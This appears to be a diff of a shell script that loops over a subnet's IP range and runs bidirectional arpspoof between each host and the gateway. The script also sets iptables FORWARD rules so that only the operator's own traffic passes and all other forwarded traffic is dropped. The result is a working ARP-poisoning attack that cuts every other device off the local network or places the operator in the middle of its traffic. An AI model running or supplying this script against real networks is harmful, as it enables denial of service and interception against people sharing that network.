@@ -65,10 +65,12 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip $i)
         (
-            # Block all the traffic except the DEVICE IP and GATEWAY
-            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-            iptables -I FORWARD ! -d "$GATEWAY" -s "$MYIP" -j DROP
-          
+          # Block all the traffic except the DEVICE IP and GATEWAY
+            iptables -A FORWARD -s "$MYIP" -d "$GATEWAY" -j ACCEPT
+            iptables -A FORWARD -s "$GATEWAY" -d "$MYIP" -j ACCEPT
+            iptables -A FORWARD -j DROP
+
+            # Bidirectional ARPspoofing policy 
             arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
             arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
         ) &
